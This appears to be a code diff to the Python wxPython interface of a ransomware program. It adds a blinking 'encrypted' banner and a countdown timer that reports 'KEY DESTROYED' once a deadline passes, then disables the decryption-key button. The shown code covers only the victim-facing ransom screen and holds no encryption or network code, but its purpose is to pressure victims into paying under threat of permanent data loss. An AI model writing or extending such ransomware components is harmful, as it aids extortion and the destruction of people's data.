@@ -8,6 +8,7 @@
 # Import libs
 import wx
 import os
+import time
 
 # Import Classes
 import GuiAbsBase
@@ -34,6 +35,9 @@ class Gui( GuiAbsBase.MainFrame, Base.Base):
 		self.encrypted_file_list = encrypted_file_list
 		self.decrypter = decrypter
 		
+		# Define other vars
+		self.set_message_to_null = True
+		
 		# Super
 		GuiAbsBase.MainFrame.__init__( self, parent=None )
 		
@@ -46,21 +50,65 @@ class Gui( GuiAbsBase.MainFrame, Base.Base):
 
 	def set_events(self):
 		'''
-		@summary: Method to define actions for GUI events
+		@summary: Create button and timer events for GUI
 		'''
 
-        # Create timer and bind to event
-        self.key_destruction_timer = wx.Timer()
-        self.key_destruction_timer.SetOwner( self, wx.ID_ANY )
-        self.key_destruction_timer.Start( 500 )
-		self.Bind(wx.EVT_BUTTON, self.blink, self.key_destruction_timer)
-
-		# Bind button events
-		# TODO Continue from here
-		self.Bind(wx.EVT_BUTTON)
+		# Create and bind timer event
+		self.key_destruction_timer = wx.Timer()
+		self.key_destruction_timer.SetOwner( self, wx.ID_ANY )
+		self.key_destruction_timer.Start( 500 )
+		self.Bind(wx.EVT_TIMER, self.blink, self.key_destruction_timer)
+		
+		# Create button events
+		# TODO Continue with implementing new dialogoues and their functionality
+		#self.Bind(wx.EVT_BUTTON, self.show_encrypted_files)
+		#self.Bind(wx.EVT_BUTTON)
 		
 		
+	def blink(self, event):
+		'''
+		@summary: Blinks the subheader text
+		'''
 		
+		# Set message to blank
+		if self.set_message_to_null:
+			self.FlashingMessageText.SetLabelText("")
+			self.set_message_to_null = False
+		# Set message to text
+		else:
+			self.FlashingMessageText.SetLabelText(self.GUI_LABEL_TEXT_FLASHING_ENCRYPTED)
+			self.set_message_to_null = True
+		
+		# Update the time remaining
+		time_remaining = self.get_time_remaining()
+		self.KeyDestructionTime.SetLabelText(time_remaining)
+		
+		# If the key has been destroyed, update the menu text
+		if time_remaining.lower() == "key destroyed":
+			# Set timer colour to black
+			self.KeyDestructionTime.SetForegroundColour( wx.SystemSettings_GetColour(
+				wx.SYS_COLOUR_CAPTIONTEXT))
+			# Disable decryption button
+			self.EnterDecryptionKeyButton.Disable()
+		
+		
+	def get_time_remaining(self):
+		'''
+		@summary: Method to read the time of encryption and determine the time remaining
+		before the decryption key is destroyed
+		@return: time remaining until decryption key is destroyed
+		'''
+		
+		seconds_elapsed = int(time.time() - int(self.start_time))
+		
+		_time_remaining = self.KEY_DESTRUCT_TIME_SECONDS - seconds_elapsed
+		if _time_remaining <= 0:
+			return "KEY DESTROYED"
+		
+		minutes, seconds = divmod(_time_remaining, 60)
+		hours, minutes = divmod(minutes, 60)
+		
+		return "%d:%02d:%02d" % (hours, minutes, seconds)
 		
 		
 	def update_visuals(self):
